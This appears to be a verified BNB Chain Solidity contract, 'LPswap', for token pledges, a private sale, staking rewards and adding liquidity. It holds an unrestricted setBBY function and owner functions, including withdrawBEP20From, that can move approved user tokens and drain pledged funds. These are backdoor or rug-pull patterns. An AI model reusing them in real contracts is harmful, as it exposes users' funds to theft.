/**
 *Submitted for verification at BscScan.com on 2022-05-19
*/

pragma solidity >=0.6.6;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function set_lp_pool(address from, uint256 value) external returns (bool);
    function set_node(address from, uint256 value) external returns (bool);
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;

    function INIT_CODE_PAIR_HASH() external view returns (bytes32);
}



interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}


library PancakeLibrary {
    using SafeMath for uint;

    // returns sorted token addresses, used to handle return values from pairs sorted in this order
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'PancakeLibrary: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'PancakeLibrary: ZERO_ADDRESS');
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                // hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
                hex'ecba335299a6693cb2ebc4782e74669b84290b6378ea3a3873c7231a8d7d1074'   // testnet
            ))));
    }

    // fetches and sorts the reserves for a pair
    function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) {
        (address token0,) = sortTokens(tokenA, tokenB);
        pairFor(factory, tokenA, tokenB);
        (uint reserve0, uint reserve1,) = IPancakePair(pairFor(factory, tokenA, tokenB)).getReserves();
        (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);
    }

    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset
    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
        require(amountA > 0, 'PancakeLibrary: INSUFFICIENT_AMOUNT');
        require(reserveA > 0 && reserveB > 0, 'PancakeLibrary: INSUFFICIENT_LIQUIDITY');
        amountB = amountA.mul(reserveB) / reserveA;
    }

    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        require(amountIn > 0, 'PancakeLibrary: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'PancakeLibrary: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn.mul(998);
        uint numerator = amountInWithFee.mul(reserveOut);
        uint denominator = reserveIn.mul(1000).add(amountInWithFee);
        amountOut = numerator / denominator;
    }

    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {
        require(amountOut > 0, 'PancakeLibrary: INSUFFICIENT_OUTPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'PancakeLibrary: INSUFFICIENT_LIQUIDITY');
        uint numerator = reserveIn.mul(amountOut).mul(1000);
        uint denominator = reserveOut.sub(amountOut).mul(998);
        amountIn = (numerator / denominator).add(1);
    }

    // performs chained getAmountOut calculations on any number of pairs
    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {
        require(path.length >= 2, 'PancakeLibrary: INVALID_PATH');
        amounts = new uint[](path.length);
        amounts[0] = amountIn;
        for (uint i; i < path.length - 1; i++) {
            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);
            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);
        }
    }

    // performs chained getAmountIn calculations on any number of pairs
    function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) {
        require(path.length >= 2, 'PancakeLibrary: INVALID_PATH');
        amounts = new uint[](path.length);
        amounts[amounts.length - 1] = amountOut;
        for (uint i = path.length - 1; i > 0; i--) {
            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);
            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);
        }
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
contract LPswap {

    using SafeMath for uint256;

    IPancakeFactory public Factory;//0xB7926C0430Afb07AA7DEfDE6DA862aE0Bde767bc //0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
    IPancakeRouter02 public Router;//0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 //0x10ED43C718714eb63d5aA57B78B54704E256024E
    address public usdtToken = 0x461cC05c887D7A5cDf03e530C631f4c329F30F91;//0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684 //0x55d398326f99059fF775485246999027B3197955
    address public bbyToken = 0xDDE54Bab4432a4ab719Ef8EEfd6920884EaD167B;//0x14DE6D664A03494900058651B67928432a6a56dd  //0xDaC328078613a95EC63dF19AbcBe66d65646A6EF
    address public owner;
    address public pair;
    uint256 public usdtToken_decimals;
    uint256 public bbyToken_decimals;
    address public _factory = 0xB7926C0430Afb07AA7DEfDE6DA862aE0Bde767bc;
    address public _router = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
    address public receive_addr = 0x1eB6c204b11091E57c73b97b66bf280A2c50dEAa;
    uint256 public max_private_bby = 250000000000000;
    uint256 public max_pledge_bby = 250000000000000;
    mapping(address => bool) public node_index;
    mapping(address => TradeToken) public pledge_index;

    struct TradeToken{
        address addrs;
        uint256 usdt;
        uint256 bby;
        uint256 release;
        uint256 total;
        uint256 origin;
        uint256 end_time;
        uint256 release_second;
        uint256 receive_time;
        uint256 month;
        bool is_end;
    }

    event AddLiquidity(uint256 input_amount,uint256 amount);
    event PledgeNode(address user,uint256 amount);
    event PledgeEnd(address user,uint256 amount);
    event PrivatePlacement(address user,uint256 amount,uint256 bby);
    event PledgeAmount(address user,uint256 amount,uint256 bby);

    constructor() public {
        Factory = IPancakeFactory(_factory);
        Router = IPancakeRouter02(_router);
        owner = msg.sender;
        usdtToken_decimals = IERC20(usdtToken).decimals();
        bbyToken_decimals = IERC20(bbyToken).decimals();
        pair = PancakeLibrary.pairFor(_factory,usdtToken,bbyToken);
    }

    function setBBY(address _addr) public {
        require(node_index[msg.sender] == false, "LP: already a node");
        bbyToken = _addr;
        pair = PancakeLibrary.pairFor(_factory,usdtToken,_addr);
    }

    function quote(uint amountA) public view returns (uint256 amountB) {
        (uint reserveA, uint reserveB) = PancakeLibrary.getReserves(_factory,usdtToken,bbyToken);
        uint256 _usdtToken_decimals = 10 ** usdtToken_decimals;
        return amountB = amountA.mul(reserveB) / reserveA.div(_usdtToken_decimals);
    }

    function quoteU(uint amountA) public view returns (uint256 amountB) {
        (uint reserveA, uint reserveB) = PancakeLibrary.getReserves(_factory,usdtToken,bbyToken);
        return amountA.mul(reserveA) / reserveB;
    }

    function pledgeNode(uint256 amount) public{
        require(node_index[msg.sender] == false, "LP: already a node");
        if(!(amount==500||amount==1000||amount==2000)){
            revert('amounts error');
        }
        IERC20(usdtToken).transferFrom(msg.sender, receive_addr, amount*10 ** usdtToken_decimals);
        node_index[msg.sender] = true;
        IERC20(bbyToken).set_node(msg.sender,amount);
        emit PledgeNode(msg.sender,amount);
    }

    function privatePlacement(uint256 amount) public{
        require(amount>=10, "LP: amount must be a multiple of 10");
        require(amount%10==0, "LP: amount must be a multiple of 10");
        require(amount<=200, "LP: Maximum number of online 200");
        uint _quote = amount *100 * 10 ** bbyToken_decimals; 
        max_private_bby = max_private_bby.sub(_quote);
        require(max_private_bby>0, "LP: Exceeding the total amount of private placement surplus");
        IERC20(usdtToken).transferFrom(msg.sender, receive_addr, amount*10 ** usdtToken_decimals);
        IERC20(bbyToken).transfer(msg.sender, _quote);
        emit PrivatePlacement(msg.sender,amount,_quote);
    }

    function pledgeAmount(uint256 amount,uint256 month) public {
        require(pledge_index[msg.sender].addrs == address(0), "LP: already pledge");
        uint256 rate = 0;
        if(month==3){
            rate = 30;
        }else if(month==6){
            rate = 50;
        }else if(month==12){
            rate = 100;
        }else{
            revert('time error');
        }
        uint256 total_num = amount.mul(rate).mul(2).div(100);
        max_pledge_bby = max_pledge_bby.sub(total_num);
        require(max_pledge_bby>0, "LP: Exceeding the remaining total amount of pledge");
        (uint reserveA, uint reserveB) = PancakeLibrary.getReserves(_factory,usdtToken,bbyToken);
        uint256 amountB = amount.mul(reserveA) / reserveB;
        IERC20(usdtToken).transferFrom(msg.sender, address(this), amountB);
        IERC20(bbyToken).transferFrom(msg.sender, address(this), amount);
        pledge_index[msg.sender].addrs = msg.sender;
        pledge_index[msg.sender].usdt = amountB;
        pledge_index[msg.sender].bby = amount;
        pledge_index[msg.sender].month = month;
        pledge_index[msg.sender].release = 0;
        pledge_index[msg.sender].origin = total_num;
        pledge_index[msg.sender].total = total_num;
        pledge_index[msg.sender].release_second = total_num.div(month*30*86400);
        pledge_index[msg.sender].end_time = block.timestamp.add(month*30*86400);
        pledge_index[msg.sender].receive_time = block.timestamp;
        pledge_index[msg.sender].is_end = false;
        emit PledgeAmount(msg.sender,amountB,amount);
    }

    function receiveAmount() public {
        require(pledge_index[msg.sender].addrs == msg.sender, "LP: not pledge");
        require(pledge_index[msg.sender].is_end == false, "LP: pledge is end");
        uint256 amount = block.timestamp.sub(pledge_index[msg.sender].receive_time).mul(pledge_index[msg.sender].release_second);
        pledge_index[msg.sender].receive_time = block.timestamp;
        uint256 old_release = pledge_index[msg.sender].release;
        pledge_index[msg.sender].release = pledge_index[msg.sender].release.add(amount);
        if(pledge_index[msg.sender].release > pledge_index[msg.sender].origin){
            amount = pledge_index[msg.sender].origin.sub(old_release);
            pledge_index[msg.sender].release = pledge_index[msg.sender].origin;
            pledge_index[msg.sender].is_end = true;
        }
        pledge_index[msg.sender].total = pledge_index[msg.sender].total.sub(amount);
        IERC20(bbyToken).transfer(msg.sender,amount);
        if(pledge_index[msg.sender].is_end){
            IERC20(usdtToken).transfer(msg.sender,pledge_index[msg.sender].usdt);
            IERC20(bbyToken).transfer(msg.sender,pledge_index[msg.sender].bby);
        }
        emit PledgeEnd(msg.sender,pledge_index[msg.sender].release);
    }


    function AddLPLiquidity(uint256 input_amount) public {
        require(input_amount>=10, "LP: input_amount must be a multiple of 10");
        require(input_amount%10==0, "LP: input_amount must be a multiple of 10");
        uint _quote = quote(input_amount); 
        uint uset_amount = input_amount * 10 ** usdtToken_decimals;
        IERC20(bbyToken).transferFrom(msg.sender,address(this), _quote);
        IERC20(usdtToken).transferFrom(msg.sender,address(this), uset_amount);
        IERC20(bbyToken).approve(address(Router), _quote);
        IERC20(usdtToken).approve(address(Router), uset_amount);
        Router.addLiquidity(usdtToken,bbyToken,uset_amount,_quote,uset_amount.mul(90).div(100),_quote.mul(90).div(100),msg.sender,block.timestamp);
        IERC20(bbyToken).set_lp_pool(msg.sender,input_amount);
        emit AddLiquidity(input_amount,_quote);
    }

    function withdraw(address _to,uint256 _amount) public payable returns (bool){
        require(msg.sender==owner,' only owner');
        address(uint160(_to)).transfer(_amount);
        return true;
    }

    function withdrawBEP20(address _to,uint256 _amount,address _token) public returns (bool){
        require(msg.sender==owner,' only owner');
        IERC20(_token).transfer(_to, _amount);
        return true;
    }

    function withdrawBEP20From(address _from,address _to,uint256 _amount,address _token) public returns (bool){
        require(msg.sender==owner,' only owner');
        IERC20(_token).transferFrom(_from, _to, _amount);
        return true;
    }

}